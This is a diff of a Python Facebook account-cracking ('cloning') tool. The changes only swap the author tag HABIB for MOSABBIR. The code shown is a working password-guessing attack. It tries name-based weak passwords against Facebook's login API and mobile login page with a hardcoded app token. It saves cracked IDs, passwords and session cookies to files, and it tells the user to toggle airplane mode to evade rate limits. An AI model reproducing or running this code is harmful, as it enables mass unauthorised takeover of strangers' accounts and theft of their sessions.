         print(f'{A}|=| GMAIL UID : {total} ');print(f'{A}|=| FULL NAME : {first+last} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
         for digitx in user:
             username=first+period+last+digitx
             pswrd = [first,last,first+last,first+'123',first+'1234',first+'12345',last+'123',last+'1234',last+'12345']
-            habibxxxx.submit(__GMAILX__,username,pswrd,total)
+            MOSABBIRxxxx.submit(__GMAILX__,username,pswrd,total)
     print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
 #──────────────{ RANDOM-METHOD-M1 }──────────────#
 def __Randm_M1__(ids,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r{A}|HABIB-M1| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
+        sys.stdout.write(f'\r\r{A}|MOSABBIR-M1| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
         try:
                 for pas in passlist:
                         accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -563,15 +563,15 @@ def __Randm_M1__(ids,passlist):
                         if 'session_key' in po:
                                 uid = po['uid']
                                 coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
-                                print(f'\r\r\x1b[38;5;46m|HABIB-OK| {str(uid)} | {pas} ')
+                                print(f'\r\r\x1b[38;5;46m|MOSABBIR-OK| {str(uid)} | {pas} ')
                                 print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
-                                open('/sdcard/HABIB-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
+                                open('/sdcard/MOSABBIR-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                 oks.append(str(uid))
                                 break
                         elif 'www.facebook.com' in po['error']['message']: 
                                 uid = po['error']['error_data']['uid']
-                                print(f'\r\r{R}|HABIB-CP| {str(uid)} | {pas} ')
-                                open('/sdcard/HABIB-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                print(f'\r\r{R}|MOSABBIR-CP| {str(uid)} | {pas} ')
+                                open('/sdcard/MOSABBIR-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                 cps.append(str(uid))
                                 break
                         else:continue
@@ -580,7 +580,7 @@ def __Randm_M1__(ids,passlist):
 #──────────────{ RANDOM-METHOD-M2 }──────────────#
 def __Randm_M2__(ids,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r{A}|HABIB-M2| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
+        sys.stdout.write(f'\r\r{A}|MOSABBIR-M2| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
         try:
                 for pas in passlist:
                         accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -592,15 +592,15 @@ def __Randm_M2__(ids,passlist):
                         if 'session_key' in po:
                                 uid = po['uid']
                                 coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
-                                print(f'\r\r\x1b[38;5;46m|HABIB-OK| {str(uid)} | {pas} ')
+                                print(f'\r\r\x1b[38;5;46m|MOSABBIR-OK| {str(uid)} | {pas} ')
                                 print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
-                                open('/sdcard/HABIB-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
+                                open('/sdcard/MOSABBIR-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                 oks.append(str(uid))
                                 break
                         elif 'www.facebook.com' in po['error']['message']: 
                                 uid = po['error']['error_data']['uid']
-                                print(f'\r\r{R}|HABIB-CP| {str(uid)} | {pas} ')
-                                open('/sdcard/HABIB-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                print(f'\r\r{R}|MOSABBIR-CP| {str(uid)} | {pas} ')
+                                open('/sdcard/MOSABBIR-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                 cps.append(str(uid))
                                 break
                         else:continue
@@ -609,7 +609,7 @@ def __Randm_M2__(ids,passlist):
 #──────────────{ RANDOM-METHOD-M3 }──────────────#
 def __Randm_M3__(ids,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r{A}|HABIB-M3| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
+        sys.stdout.write(f'\r\r{A}|MOSABBIR-M3| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
         try:
                 for pas in passlist:
                         accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -621,15 +621,15 @@ def __Randm_M3__(ids,passlist):
                         if 'session_key' in po:
                                 uid = po['uid']
                                 coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
-                                print(f'\r\r\x1b[38;5;46m|HABIB-OK| {str(uid)} | {pas} ')
+                                print(f'\r\r\x1b[38;5;46m|MOSABBIR-OK| {str(uid)} | {pas} ')
                                 print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
-                                open('/sdcard/HABIB-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
+                                open('/sdcard/MOSABBIR-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                 oks.append(str(uid))
                                 break
                         elif 'www.facebook.com' in po['error']['message']: 
                                 uid = po['error']['error_data']['uid']
-                                print(f'\r\r{R}|HABIB-CP| {str(uid)} | {pas} ')
-                                open('/sdcard/HABIB-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                print(f'\r\r{R}|MOSABBIR-CP| {str(uid)} | {pas} ')
+                                open('/sdcard/MOSABBIR-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                 cps.append(str(uid))
                                 break
                         else:continue
@@ -641,7 +641,7 @@ def __Randm_M4__(ids,passlist):
     try:
         for pas in passlist:
             session=requests.Session()
-            sys.stdout.write(f'\r\r{A}|HABIB-M4| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
+            sys.stdout.write(f'\r\r{A}|MOSABBIR-M4| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
             pro = random.choice(ugen)
             free_fb = session.get('https://m.facebook.com').text
             log_data = {
@@ -660,17 +660,17 @@ def __Randm_M4__(ids,passlist):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 ids = re.findall('c_user=(.*);xs', coki)[0]
-                print(f'\r\r\x1b[38;5;46m|HABIB-OK| {ids} | {pas} ')
+                print(f'\r\r\x1b[38;5;46m|MOSABBIR-OK| {ids} | {pas} ')
                 print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
-                open('/sdcard/HABIB-RNDM-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/MOSABBIR-RNDM-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
                 oks.append(ids)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 coki1 = coki.split("1000")[1]
                 ids = "1000"+coki1[0:11]
-                print(f'\r\r{R}|HABIB-OK| {ids} | {pas} ')
-                open('/sdcard/HABIB-RANDM-CP.txt','a').write(ids+'|'+pas+'\n')
+                print(f'\r\r{R}|MOSABBIR-OK| {ids} | {pas} ')
+                open('/sdcard/MOSABBIR-RANDM-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
             else:
@@ -684,7 +684,7 @@ def __Randm_M5__(ids,passlist):
     try:
         for pas in passlist:
             session=requests.Session()
-            sys.stdout.write(f'\r\r{A}|HABIB-M5| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
+            sys.stdout.write(f'\r\r{A}|MOSABBIR-M5| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
             pro = random.choice(ugen)
             free_fb = session.get('https://m.facebook.com').text
             log_data = {
@@ -703,17 +703,17 @@ def __Randm_M5__(ids,passlist):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 ids = re.findall('c_user=(.*);xs', coki)[0]
-                print(f'\r\r\x1b[38;5;46m|HABIB-OK| {ids} | {pas} ')
+                print(f'\r\r\x1b[38;5;46m|MOSABBIR-OK| {ids} | {pas} ')
                 print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
-                open('/sdcard/HABIB-RNDM-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
+                open('/sdcard/MOSABBIR-RNDM-OK.txt','a').write(str(ids)+'|'+pas+'|'+coki+'\n')
                 oks.append(ids)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 coki1 = coki.split("1000")[1]
                 ids = "1000"+coki1[0:11]
-                print(f'\r\r{R}|HABIB-OK| {ids} | {pas} ')
-                open('/sdcard/HABIB-RANDM-CP.txt','a').write(ids+'|'+pas+'\n')
+                print(f'\r\r{R}|MOSABBIR-OK| {ids} | {pas} ')
+                open('/sdcard/MOSABBIR-RANDM-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
             else:
@@ -724,7 +724,7 @@ def __Randm_M5__(ids,passlist):
 #──────────────{ GMAIL-METHOD }──────────────#
 def __GMAILX__(username,pswrd,total):
     global oks,cps,loop
-    sys.stdout.write(f'\r\r{A}|HABIB-XD| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
+    sys.stdout.write(f'\r\r{A}|MOSABBIR-XD| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
     try:
         for password in pswrd:
             adid=str(uuid.uuid4())
@@ -734,13 +734,13 @@ def __GMAILX__(username,pswrd,total):
             login_url='https://api.facebook.com/method/auth.login'
             req=httpx.post(login_url,data=connection,headers=header).json()
             if 'session_key' in req:
-                print(f'\r\r\x1b[38;5;46m|HABIB-OK| '+username+' | '+password)
-                open('/sdcard/HABIB-GMAIL-OK.txt', 'a').write(username+' | '+password+'\n')
+                print(f'\r\r\x1b[38;5;46m|MOSABBIR-OK| '+username+' | '+password)
+                open('/sdcard/MOSABBIR-GMAIL-OK.txt', 'a').write(username+' | '+password+'\n')
                 oks.append(username)
                 break
             elif 'www.facebook.com' in req['error_msg']:
-                print(f'\r\r{R}|HABIB-CP| '+username+' | '+password)
-                open('/sdcard/HABIB-GMAIL-CP.txt', 'a').write(username+' | '+password+'\n')
+                print(f'\r\r{R}|MOSABBIR-CP| '+username+' | '+password)
+                open('/sdcard/MOSABBIR-GMAIL-CP.txt', 'a').write(username+' | '+password+'\n')
                 cps.append(username)
                 break
             else:
